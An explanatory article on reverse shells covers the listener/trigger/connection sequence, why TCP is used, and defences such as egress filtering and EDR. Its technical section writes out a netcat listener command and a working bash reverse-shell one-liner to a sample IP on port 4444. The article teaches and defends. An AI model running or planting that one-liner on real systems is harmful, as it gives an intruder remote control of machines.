In network security, a **reverse shell** is a type of connection where the target machine initiates an outgoing connection to
the attacker's machine.

While a traditional shell (like SSH) involves you connecting to a server, a reverse shell flips the script. This is
particularly effective for bypassing firewalls, which typically block incoming connections but are often much more permissive
with outgoing traffic.

---

## How it Works: Step-by-Step

To understand a reverse shell, think of it as a three-part handshake between the attacker and the victim.

### 1. The Listener (Attacker)

The attacker sets up a "listener" on their machine. This tells the computer to wait for an incoming connection on a specific
port (e.g., port 4444).

> **Analogy:** This is like the attacker picking up a phone and waiting for it to ring.

### 2. The Trigger (Victim)

The attacker must find a way to execute a command on the target system. This is usually done through a vulnerability, a
malicious script, or social engineering. The command tells the victim's computer: _"Connect to the attacker's IP at port 4444
and give them control of my command prompt."_

### 3. The Connection (TCP Handshake)

Once the victim executes the command, a **TCP connection** is established.

- **Outbound Traffic:** The target machine initiates the connection. Since most firewalls see this as "internal user visiting
  a website" or "app checking for updates," they let the traffic through.
- **Input/Output Redirection:** The target machine redirects its standard input ($stdin$), standard output ($stdout$), and
  standard error ($stderr$) to the network socket.

---

## The Technical Mechanism

When using a tool like `netcat` ($nc$), the process looks like this mathematically and logically:

1. **Attacker Command:** `nc -lvp 4444` _(Listen, Verbose, Port 4444)_
2. **Victim Command (Example in Bash):** `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`

### Breakdown of the Bash Command:

- `bash -i`: Starts an interactive bash shell.
- `>& /dev/tcp/[IP]/[PORT]`: Redirects the output ($stdout$) and error ($stderr$) of that shell to a TCP socket connecting to
  the attacker.
- `0>&1`: Takes the input ($stdin$) from that same TCP socket.

---

## Why use TCP?

While reverse shells can technically run over UDP or even DNS/HTTP, **TCP** is the gold standard for two reasons:

- **Reliability:** TCP ensures that packets arrive in the correct order and without errors. If a command you type is
  "corrupted" or lost in transit, the shell would break; TCP prevents this.
- **Stateful Connection:** TCP maintains a continuous session, allowing for a real-time, interactive experience as if you
  were sitting right at the target's keyboard.

---

## Security Implications & Defense

Reverse shells are a primary tool used by penetration testers to prove "Remote Code Execution" (RCE). However, they are also
a favorite for malware and ransomware.

**How to defend against them:**

- **Egress Filtering:** Don't just block what comes _in_; block what goes _out_. If a web server has no business connecting
  to a random IP on port 4444, the firewall should kill that connection.
- **Least Privilege:** Ensure applications don't have the permissions to execute shell commands like `/bin/sh` or
  `powershell.exe` unnecessarily.
- **EDR (Endpoint Detection and Response):** Modern security tools look for "suspicious parent-child processes," such as a
  web server (Apache/Nginx) suddenly spawning a Bash shell.
